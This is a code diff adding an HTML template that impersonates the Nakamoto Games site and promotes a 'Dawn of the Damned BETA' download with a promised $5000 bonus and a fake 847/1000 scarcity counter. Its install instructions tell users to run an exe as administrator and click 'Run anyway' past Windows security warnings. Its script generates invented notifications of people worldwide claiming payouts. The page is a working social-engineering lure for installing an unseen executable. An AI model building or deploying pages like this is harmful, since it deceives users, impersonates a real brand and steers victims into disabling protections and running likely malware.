@@ -1,0 +1,984 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Nakamoto Games - Play to Earn</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+  <style>
+    :root {
+      --primary-color: #6C5DD3;
+      --accent-color: #FF4444;
+      --bg-dark: #0A0E17;
+      --text-light: rgba(255, 255, 255, 0.7);
+    }
+
+    body {
+      background-color: var(--bg-dark);
+      color: white;
+      font-family: 'Inter', sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+
+    /* Header Styles */
+    .nav-header {
+      background: rgba(10, 14, 23, 0.95);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+      padding: 1rem 0;
+      position: fixed;
+      width: 100%;
+      top: 0;
+      z-index: 100;
+    }
+
+    .nav-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 1rem;
+    }
+
+    .logo-naka-icon {
+      display: flex;
+      gap: 10px;
+      border-radius: 8px;
+      padding: 2px 12px 2px 2px;
+      align-items: center;
+      background-color: #F42728;
+      text-decoration: none;
+    }
+
+    .icon-base {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 26px;
+      width: 40px;
+      border-radius: 6px;
+      background-color: #FFFFFF;
+      color: #F42728;
+      font-size: 22px;
+    }
+
+    .logo-text {
+      display: flex;
+      align-items: center;
+      font-weight: bold;
+      font-size: 14px;
+      text-transform: uppercase;
+      color: #FFFFFF;
+      overflow: hidden;
+      height: 16px;
+      margin-bottom: -3px;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      text-decoration: none;
+      color: white;
+    }
+
+    .logo img {
+      height: 32px;
+    }
+
+    .nav-links {
+      display: flex;
+      gap: 2rem;
+    }
+
+    .nav-link {
+      color: var(--text-light);
+      text-decoration: none;
+      font-size: 0.9rem;
+      transition: color 0.3s;
+    }
+
+    .nav-link:hover {
+      color: white;
+    }
+
+    .nav-right {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+    }
+
+    .login-btn {
+      background: var(--primary-color);
+      color: white;
+      border: none;
+      padding: 0.5rem 1.5rem;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: 500;
+    }
+
+    /* Main Content */
+    .main-content {
+      margin-top: 80px;
+      padding: 2rem 1rem;
+      max-width: 1200px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    /* Game Card */
+    .game-card {
+      background: radial-gradient(42.61% 45.86% at 50% 50%, rgba(13, 17, 27, 0.8) 0%, rgba(9, 12, 18, 0.8) 100%);
+      border-radius: 24px;
+      overflow: hidden;
+      margin-bottom: 2rem;
+      position: relative;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .game-image {
+      width: 100%;
+      height: 400px;
+      object-fit: cover;
+      opacity: 0.8;
+    }
+
+    .game-info {
+      padding: 2.5rem;
+      position: relative;
+      z-index: 2;
+      max-width: 800px;
+      margin: 0 auto;
+      text-align: center;
+    }
+
+    .chip-container {
+      position: relative;
+      display: inline-flex;
+      height: 27px;
+      border-radius: 60px;
+      backdrop-filter: blur(2px);
+      overflow: hidden;
+      margin-bottom: 1.25rem;
+    }
+
+    .chip-label {
+      position: relative;
+      z-index: 2;
+      display: flex;
+      height: 100%;
+      align-items: center;
+      padding: 0 1rem;
+      font-size: 0.75rem;
+      font-weight: 700;
+      letter-spacing: 2.88px;
+      text-transform: uppercase;
+      background: linear-gradient(180deg, rgba(255, 255, 255, 0.9) 0%, rgba(255, 255, 255, 0.7) 100%);
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .chip-container::before {
+      content: '';
+      position: absolute;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(to top, rgba(255, 255, 255, 0.05), transparent);
+      z-index: 1;
+    }
+
+    .chip-container::after {
+      content: '';
+      position: absolute;
+      left: 1px;
+      top: 1px;
+      width: calc(100% - 2px);
+      height: calc(100% - 2px);
+      border-radius: 60px;
+      background: rgba(9, 12, 18, 0.8);
+      z-index: 0;
+    }
+
+    .bg-title-gradient {
+      background: linear-gradient(180deg, rgba(255, 255, 255, 0.9) 0%, rgba(255, 255, 255, 0.7) 100%);
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
+      font-size: 2.5rem;
+      line-height: 1.2;
+      margin-bottom: 1rem;
+      max-width: 700px;
+      font-weight: 700;
+    }
+
+    .game-description {
+      font-size: 1.125rem;
+      line-height: 1.5;
+      margin-bottom: 2rem;
+      color: rgba(255, 255, 255, 0.8);
+    }
+
+    .download-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 1rem;
+      background-color: #F42728;
+      border: none;
+      border-radius: 8px;
+      padding: 1rem 1.5rem;
+      color: #fff;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s ease-in-out;
+      box-shadow: 0 4px 12px rgba(244, 39, 40, 0.3);
+    }
+
+    .download-btn:hover {
+      background-color: #d81f20;
+      box-shadow: 0 6px 16px rgba(244, 39, 40, 0.4);
+      transform: translateY(-1px);
+    }
+
+    .download-count {
+      display: flex;
+      align-items: center;
+      gap: 0.25rem;
+      padding-left: 1rem;
+      border-left: 1px solid rgba(255, 255, 255, 0.2);
+      font-size: 0.875rem;
+    }
+
+    .download-count .count {
+      color: #fff;
+      font-weight: 700;
+    }
+
+    .download-count .total {
+      color: rgba(255, 255, 255, 0.8);
+    }
+
+    @media (max-width: 768px) {
+      .bg-title-gradient {
+        font-size: 2rem;
+      }
+      
+      .game-description {
+        font-size: 1rem;
+      }
+      
+      .game-info {
+        padding: 1.5rem;
+        text-align: left;
+      }
+      
+      .download-btn {
+        width: 100%;
+        justify-content: center;
+      }
+    }
+
+    /* Marketplace Section */
+    .marketplace-section {
+      background: rgba(255, 255, 255, 0.02);
+      border-radius: 16px;
+      padding: 2rem;
+      margin-bottom: 2rem;
+    }
+
+    .section-title {
+      font-size: 1.25rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .features-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 1rem;
+    }
+
+    .feature-card {
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 12px;
+      padding: 1.5rem;
+      text-align: center;
+    }
+
+    .feature-icon {
+      width: 48px;
+      height: 48px;
+      margin-bottom: 1rem;
+    }
+
+    .feature-title {
+      font-size: 1rem;
+      margin-bottom: 0.5rem;
+    }
+
+    .feature-description {
+      color: var(--text-light);
+      font-size: 0.9rem;
+    }
+
+    /* Launcher Section */
+    .launcher-section {
+      background: linear-gradient(45deg, #2a1f6d, #1a1333);
+      border-radius: 16px;
+      padding: 2rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .launcher-content {
+      flex: 1;
+    }
+
+    .launcher-image {
+      width: 200px;
+      margin-left: 2rem;
+    }
+
+    /* Mobile Responsiveness */
+    @media (max-width: 768px) {
+      .nav-links {
+        display: none;
+      }
+
+      .features-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .launcher-section {
+        flex-direction: column;
+        text-align: center;
+      }
+
+      .launcher-image {
+        margin: 2rem 0 0 0;
+      }
+
+      .logo-text {
+        width: 87px;
+      }
+    }
+
+    /* Notification Styles */
+    .notification-container {
+      position: fixed;
+      bottom: 20px;
+      left: 20px;
+      z-index: 1000;
+    }
+
+    .notification {
+      background: rgba(10, 14, 23, 0.95);
+      border: 1px solid rgba(108, 93, 211, 0.4);
+      border-radius: 12px;
+      padding: 12px 16px;
+      margin-top: 10px;
+      color: white;
+      font-size: 14px;
+      transform: translateX(-120%);
+      opacity: 0;
+      transition: all 0.3s ease-in-out;
+      max-width: 300px;
+    }
+
+    .notification.show {
+      transform: translateX(0);
+      opacity: 1;
+    }
+
+    .notification .amount {
+      color: #22c55e;
+      font-weight: 600;
+    }
+
+    .notification .location {
+      color: var(--text-light);
+    }
+
+    /* Footer Styles */
+    .footer {
+      background: rgba(255, 255, 255, 0.02);
+      padding: 4rem 0 2rem;
+      margin-top: 4rem;
+    }
+
+    .footer-content {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 1rem;
+    }
+
+    .footer-sections {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 2rem;
+      margin-bottom: 4rem;
+    }
+
+    .footer-section h4 {
+      color: white;
+      font-size: 1rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .footer-section ul {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+
+    .footer-section ul li {
+      margin-bottom: 0.75rem;
+    }
+
+    .footer-section ul li a {
+      color: var(--text-light);
+      text-decoration: none;
+      font-size: 0.9rem;
+      transition: color 0.3s;
+    }
+
+    .footer-section ul li a:hover {
+      color: white;
+    }
+
+    .footer-bottom {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 2rem 0;
+      border-top: 1px solid rgba(255, 255, 255, 0.1);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .footer-info {
+      max-width: 400px;
+    }
+
+    .footer-info p {
+      color: var(--text-light);
+      margin-bottom: 1rem;
+    }
+
+    .join-btn {
+      background: var(--primary-color);
+      color: white;
+      border: none;
+      padding: 0.75rem 2rem;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: 500;
+    }
+
+    .footer-social {
+      display: flex;
+      gap: 1rem;
+    }
+
+    .social-icon {
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 50%;
+      transition: background 0.3s;
+    }
+
+    .social-icon:hover {
+      background: rgba(255, 255, 255, 0.2);
+    }
+
+    .social-icon img {
+      width: 16px;
+      height: 16px;
+    }
+
+    .footer-copyright {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding-top: 2rem;
+      color: var(--text-light);
+      font-size: 0.8rem;
+    }
+
+    .footer-links {
+      display: flex;
+      gap: 2rem;
+    }
+
+    .footer-links a {
+      color: var(--text-light);
+      text-decoration: none;
+    }
+
+    .powered-by {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .powered-by img {
+      height: 20px;
+    }
+
+    @media (max-width: 768px) {
+      .footer-sections {
+        grid-template-columns: 1fr;
+        gap: 2rem;
+      }
+
+      .footer-bottom {
+        flex-direction: column;
+        text-align: center;
+        gap: 2rem;
+      }
+
+      .footer-copyright {
+        flex-direction: column;
+        gap: 1rem;
+        text-align: center;
+      }
+
+      .footer-links {
+        justify-content: center;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Navigation Header -->
+  <header class="nav-header">
+    <div class="nav-container">
+      <a href="/" class="logo-naka-icon">
+        <div class="icon-base">.</div>
+        <span class="logo-text">NAKAMOTO.GAMES</span>
+        <img src="{{ url_for('static', filename='icons/naka-logo.svg') }}" alt="NAKA" style="height: 5px; margin-left: 5px;">
+      </a>
+
+      <nav class="nav-links">
+        <a href="#" class="nav-link">Games</a>
+        <a href="#" class="nav-link">Services</a>
+        <a href="#" class="nav-link">Naka Ecosystem</a>
+      </nav>
+
+      <div class="nav-right">
+        <button class="login-btn">Login</button>
+      </div>
+    </div>
+  </header>
+
+  <main class="main-content">
+    <!-- Featured Game Card -->
+    <div class="game-card">
+      <img src="{{ url_for('static', filename='dawn-of-damned.jpg') }}" alt="Dawn of the Damned" class="game-image">
+      <div class="game-info">
+        <div class="chip-container">
+          <span class="chip-label">BETA ACCESS</span>
+        </div>
+        <h2 class="bg-title-gradient">Download Dawn of the Damned BETA and Get $5000 Bonus</h2>
+        <p class="game-description">Be among the first 1,000 users to download and play the trial to claim your $5000 bonus. Windows PC only.</p>
+        <button id="downloadBtn" class="download-btn" onclick="handleDownload()">
+          Download Now
+          <div class="download-count">
+            <span class="count">847</span>
+            <span class="total">/1000</span>
+          </div>
+        </button>
+      </div>
+    </div>
+
+    <!-- Marketplace Section -->
+    <div class="marketplace-section">
+      <h3 class="section-title">MARKETPLACE</h3>
+      <div class="features-grid">
+        <div class="feature-card">
+          <img src="{{ url_for('static', filename='naka-swap.svg') }}" alt="NAKA Swap" class="feature-icon">
+          <h4 class="feature-title">NAKA Swap</h4>
+          <p class="feature-description">Seamless token swapping for the NAKA Economy</p>
+        </div>
+        <div class="feature-card">
+          <img src="{{ url_for('static', filename='staking.svg') }}" alt="Staking" class="feature-icon">
+          <h4 class="feature-title">Staking</h4>
+          <p class="feature-description">Earn rewards by staking your NAKA tokens</p>
+        </div>
+        <div class="feature-card">
+          <img src="{{ url_for('static', filename='referral.svg') }}" alt="Referral" class="feature-icon">
+          <h4 class="feature-title">Referral</h4>
+          <p class="feature-description">Invite friends and earn rewards together</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Launcher Section -->
+    <div class="launcher-section">
+      <div class="launcher-content">
+        <h3 class="section-title">NAKA LAUNCHER</h3>
+        <p class="game-description">SEAMLESS ACCESS TO PREMIUM GAMES</p>
+        <button class="play-now-btn">Explore</button>
+      </div>
+      <img src="{{ url_for('static', filename='launcher-rocket.jpg') }}" alt="NAKA Launcher" class="launcher-image">
+    </div>
+  </main>
+
+  <!-- Mobile Warning Modal -->
+  <div id="mobileModal" class="modal">
+    <div class="modal-content">
+      <button class="close-modal" onclick="closeModal()">×</button>
+      <h2>Desktop Required</h2>
+      <p>Please use a desktop computer to download and play Dawn of the Damned.</p>
+      <button class="modal-btn" onclick="closeModal()">Got it</button>
+    </div>
+  </div>
+
+  <!-- Installation Instructions Modal -->
+  <div id="instructionsModal" class="modal">
+    <div class="modal-content">
+      <button class="close-modal" onclick="closeInstructionsModal()">×</button>
+      <h2>Installation Instructions</h2>
+      <div class="installation-steps">
+        <div class="step">
+          <h3>Step 1: Extract the ZIP file</h3>
+          <ul>
+            <li>Locate the downloaded <code>nakmoto_v1.2.6.zip</code> file</li>
+            <li>Right-click and select "Extract All" or use WinRAR/7-Zip</li>
+            <li>Choose a destination folder and click Extract</li>
+          </ul>
+        </div>
+
+        <div class="step">
+          <h3>Step 2: Install the Game</h3>
+          <ul>
+            <li>Open the extracted folder</li>
+            <li>Run <code>v1_2_6.exe</code> as administrator</li>
+            <li>Follow the installation wizard</li>
+            <li class="note">Note: If Windows shows a security warning, click "More info" and "Run anyway"</li>
+          </ul>
+        </div>
+
+        <div class="step">
+          <h3>Step 3: Start Playing</h3>
+          <ul>
+            <li>Launch Dawn of the Damned</li>
+            <li>Create your account or sign in</li>
+            <li>Start your adventure!</li>
+          </ul>
+        </div>
+      </div>
+      <button class="modal-btn" onclick="closeInstructionsModal()">Got it</button>
+    </div>
+  </div>
+
+  <div class="notification-container" id="notificationContainer"></div>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="footer-content">
+      <div class="footer-sections">
+        <div class="footer-section">
+          <h4>GAMES</h4>
+          <ul>
+            <li><a href="#">Play to Earn Games</a></li>
+            <li><a href="#">Free to Play Games</a></li>
+            <li><a href="#">Story Mode Games</a></li>
+            <li><a href="#">Arcade Emporium</a></li>
+            <li><a href="#">Challenger Games</a></li>
+            <li><a href="#">FlipIt2D Games</a></li>
+            <li><a href="#">Mobile Apps</a></li>
+          </ul>
+        </div>
+        <div class="footer-section">
+          <h4>SERVICES</h4>
+          <ul>
+            <li><a href="#">Stakedown</a></li>
+            <li><a href="#">Referral</a></li>
+            <li><a href="#">Coupon</a></li>
+            <li><a href="#">Naka Quest</a></li>
+            <li><a href="#">Season Pass</a></li>
+            <li><a href="#">Deposit Rewards</a></li>
+            <li><a href="#">Lucky Wheel</a></li>
+            <li><a href="#">Asset Promo</a></li>
+          </ul>
+        </div>
+        <div class="footer-section">
+          <h4>NAKA ECOSYSTEMS</h4>
+          <ul>
+            <li><a href="#">Marketplace</a></li>
+            <li><a href="#">Nakaverse</a></li>
+            <li><a href="#">Nakagames</a></li>
+            <li><a href="#">Blog</a></li>
+            <li><a href="#">About Us</a></li>
+            <li><a href="#">FAQ</a></li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="footer-bottom">
+        <div class="footer-info">
+          <p>Join the industry's first comprehensive Play to Earn ecosystem.</p>
+          <button class="join-btn">Join Nakamoto Games</button>
+        </div>
+        <div class="footer-social">
+          <a href="#" class="social-icon"><img src="{{ url_for('static', filename='icons/discord.svg') }}" alt="Discord"></a>
+          <a href="#" class="social-icon"><img src="{{ url_for('static', filename='icons/twitter.svg') }}" alt="Twitter"></a>
+          <a href="#" class="social-icon"><img src="{{ url_for('static', filename='icons/medium.svg') }}" alt="Medium"></a>
+          <a href="#" class="social-icon"><img src="{{ url_for('static', filename='icons/facebook.svg') }}" alt="Facebook"></a>
+          <a href="#" class="social-icon"><img src="{{ url_for('static', filename='icons/telegram.svg') }}" alt="Telegram"></a>
+          <a href="#" class="social-icon"><img src="{{ url_for('static', filename='icons/tiktok.svg') }}" alt="TikTok"></a>
+        </div>
+      </div>
+
+      <div class="footer-copyright">
+        <p>COPYRIGHT © 2024 © NAKAMOTO GAMES</p>
+        <div class="footer-links">
+          <a href="#">PRIVACY POLICY</a>
+          <a href="#">LEGAL</a>
+        </div>
+        <div class="powered-by">
+          <span>SECURE BY</span>
+          <img src="{{ url_for('static', filename='icons/polygon.svg') }}" alt="Polygon Network">
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    // Mobile detection function
+    function isMobile() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth <= 768;
+    }
+
+    // Get DOM elements
+    const downloadBtn = document.getElementById('downloadBtn');
+    const mobileModal = document.getElementById('mobileModal');
+    const instructionsModal = document.getElementById('instructionsModal');
+    const closeModalBtns = document.querySelectorAll('.close-modal');
+
+    // Handle download button click
+    function handleDownload() {
+      if (isMobile()) {
+        showModal();
+      } else {
+        // Show instructions modal first
+        showInstructionsModal();
+        // Start download
+        window.location.href = '/download';
+      }
+    }
+
+    // Show/close modal functions
+    function showModal() {
+      if (mobileModal) {
+        mobileModal.style.display = 'block';
+      }
+    }
+
+    function showInstructionsModal() {
+      if (instructionsModal) {
+        instructionsModal.style.display = 'block';
+      }
+    }
+
+    function closeModal() {
+      if (mobileModal) {
+        mobileModal.style.display = 'none';
+      }
+    }
+
+    function closeInstructionsModal() {
+      if (instructionsModal) {
+        instructionsModal.style.display = 'none';
+      }
+    }
+
+    // Check for mobile on resize
+    window.addEventListener('resize', function() {
+      if (isMobile()) {
+        if (downloadBtn && !downloadBtn.classList.contains('disabled')) {
+          downloadBtn.classList.add('disabled');
+        }
+      } else {
+        if (downloadBtn) {
+          downloadBtn.classList.remove('disabled');
+        }
+      }
+    });
+
+    // Fake data for notifications
+    const names = [
+      // Western names
+      'Greg', 'Andrew', 'Emma', 'Sophie', 'James', 'William', 'Oliver', 'Charlotte', 'Lucas', 'Henry',
+      'Ethan', 'Alexander', 'Michael', 'Daniel', 'David', 'Sarah', 'Emily', 'Isabella', 'Sophia', 'Olivia',
+      // Asian names
+      'Jing', 'Yuki', 'Wei', 'Hiroshi', 'Jin', 'Seo-yeon', 'Ming', 'Kai', 'Yuna', 'Haruto',
+      'Ravi', 'Arjun', 'Priya', 'Arun', 'Deepak', 'Ananya', 'Zara', 'Ayesha', 'Krishna', 'Aarav',
+      // European names
+      'Ivan', 'Hans', 'Klaus', 'Sofia', 'Anna', 'Marco', 'Giuseppe', 'Pavel', 'Dmitri', 'Viktor',
+      'Luca', 'Francesco', 'Elena', 'Natasha', 'Anastasia', 'Pierre', 'Jean', 'Marie', 'Luis', 'Carlos',
+      // Middle Eastern names
+      'Ahmed', 'Mohammed', 'Fatima', 'Hassan', 'Ali', 'Yasmin', 'Omar', 'Leila', 'Karim', 'Amir',
+      // Latin American names
+      'Maria', 'Jose', 'Juan', 'Miguel', 'Roberto', 'Ana', 'Isabella', 'Gabriel', 'Rafael', 'Diego',
+      // African names
+      'Kwame', 'Chioma', 'Oluwaseun', 'Amara', 'Tendai', 'Zainab', 'Malik', 'Aisha', 'Jabari', 'Folami'
+    ];
+
+    const locations = [
+      // North America
+      { city: 'New York', country: 'USA' },
+      { city: 'Los Angeles', country: 'USA' },
+      { city: 'Chicago', country: 'USA' },
+      { city: 'Toronto', country: 'Canada' },
+      { city: 'Vancouver', country: 'Canada' },
+      { city: 'Montreal', country: 'Canada' },
+      { city: 'Texas', country: 'USA' },
+      { city: 'Miami', country: 'USA' },
+      { city: 'Seattle', country: 'USA' },
+      { city: 'Boston', country: 'USA' },
+      
+      // Europe
+      { city: 'London', country: 'UK' },
+      { city: 'Manchester', country: 'UK' },
+      { city: 'Liverpool', country: 'UK' },
+      { city: 'Paris', country: 'France' },
+      { city: 'Lyon', country: 'France' },
+      { city: 'Berlin', country: 'Germany' },
+      { city: 'Munich', country: 'Germany' },
+      { city: 'Madrid', country: 'Spain' },
+      { city: 'Barcelona', country: 'Spain' },
+      { city: 'Rome', country: 'Italy' },
+      { city: 'Milan', country: 'Italy' },
+      { city: 'Amsterdam', country: 'Netherlands' },
+      { city: 'Brussels', country: 'Belgium' },
+      { city: 'Vienna', country: 'Austria' },
+      { city: 'Stockholm', country: 'Sweden' },
+      { city: 'Oslo', country: 'Norway' },
+      { city: 'Moscow', country: 'Russia' },
+      { city: 'St. Petersburg', country: 'Russia' },
+      
+      // Asia
+      { city: 'Tokyo', country: 'Japan' },
+      { city: 'Osaka', country: 'Japan' },
+      { city: 'Seoul', country: 'South Korea' },
+      { city: 'Busan', country: 'South Korea' },
+      { city: 'Beijing', country: 'China' },
+      { city: 'Shanghai', country: 'China' },
+      { city: 'Hong Kong', country: 'China' },
+      { city: 'Singapore', country: 'Singapore' },
+      { city: 'Mumbai', country: 'India' },
+      { city: 'Delhi', country: 'India' },
+      { city: 'Bangalore', country: 'India' },
+      { city: 'Bangkok', country: 'Thailand' },
+      { city: 'Manila', country: 'Philippines' },
+      { city: 'Jakarta', country: 'Indonesia' },
+      
+      // Middle East
+      { city: 'Dubai', country: 'UAE' },
+      { city: 'Abu Dhabi', country: 'UAE' },
+      { city: 'Doha', country: 'Qatar' },
+      { city: 'Riyadh', country: 'Saudi Arabia' },
+      { city: 'Istanbul', country: 'Turkey' },
+      
+      // Oceania
+      { city: 'Sydney', country: 'Australia' },
+      { city: 'Melbourne', country: 'Australia' },
+      { city: 'Brisbane', country: 'Australia' },
+      { city: 'Perth', country: 'Australia' },
+      { city: 'Auckland', country: 'New Zealand' },
+      
+      // Latin America
+      { city: 'Mexico City', country: 'Mexico' },
+      { city: 'São Paulo', country: 'Brazil' },
+      { city: 'Rio de Janeiro', country: 'Brazil' },
+      { city: 'Buenos Aires', country: 'Argentina' },
+      { city: 'Santiago', country: 'Chile' },
+      { city: 'Lima', country: 'Peru' },
+      { city: 'Bogotá', country: 'Colombia' },
+      
+      // Africa
+      { city: 'Cairo', country: 'Egypt' },
+      { city: 'Lagos', country: 'Nigeria' },
+      { city: 'Nairobi', country: 'Kenya' },
+      { city: 'Cape Town', country: 'South Africa' },
+      { city: 'Johannesburg', country: 'South Africa' },
+      { city: 'Casablanca', country: 'Morocco' }
+    ];
+
+    // Remove the predefined amounts array and add a function to generate random amounts
+    function getRandomAmount() {
+      // Generate base amount between 500 and 5000
+      let baseAmount = Math.floor(Math.random() * 4501) + 500;
+      
+      // Round to nearest 50 or 100 to make it look more realistic
+      if (baseAmount < 1000) {
+        baseAmount = Math.round(baseAmount / 50) * 50; // Round to nearest 50 for smaller amounts
+      } else {
+        baseAmount = Math.round(baseAmount / 100) * 100; // Round to nearest 100 for larger amounts
+      }
+      
+      // 10% chance of a special high amount between 5000 and 10000
+      if (Math.random() < 0.1) {
+        baseAmount = Math.floor(Math.random() * 5001) + 5000;
+        baseAmount = Math.round(baseAmount / 500) * 500; // Round to nearest 500 for large amounts
+      }
+      
+      return baseAmount;
+    }
+
+    function createNotification() {
+      const name = names[Math.floor(Math.random() * names.length)];
+      const location = locations[Math.floor(Math.random() * locations.length)];
+      const amount = getRandomAmount();
+      const isDownload = Math.random() < 0.3; // 30% chance of just download notification
+
+      const notification = document.createElement('div');
+      notification.className = 'notification';
+      
+      if (isDownload) {
+        notification.innerHTML = `<strong>${name}</strong> from <span class="location">${location.city}, ${location.country}</span> just downloaded`;
+      } else {
+        notification.innerHTML = `<strong>${name}</strong> from <span class="location">${location.city}, ${location.country}</span> just installed and claimed <span class="amount">$${amount.toLocaleString()}</span>`;
+      }
+
+      const container = document.getElementById('notificationContainer');
+      container.appendChild(notification);
+
+      // Trigger animation
+      setTimeout(() => {
+        notification.classList.add('show');
+      }, 100);
+
+      // Remove notification after 5 seconds
+      setTimeout(() => {
+        notification.classList.remove('show');
+        setTimeout(() => {
+          container.removeChild(notification);
+        }, 300);
+      }, 5000);
+    }
+
+    // Show first notification after 2 seconds
+    setTimeout(() => {
+      createNotification();
+      // Then show new notifications randomly between 3 and 8 seconds
+      setInterval(() => {
+        createNotification();
+      }, Math.random() * 5000 + 3000);
+    }, 2000);
+  </script>
+</body>
+</html> 
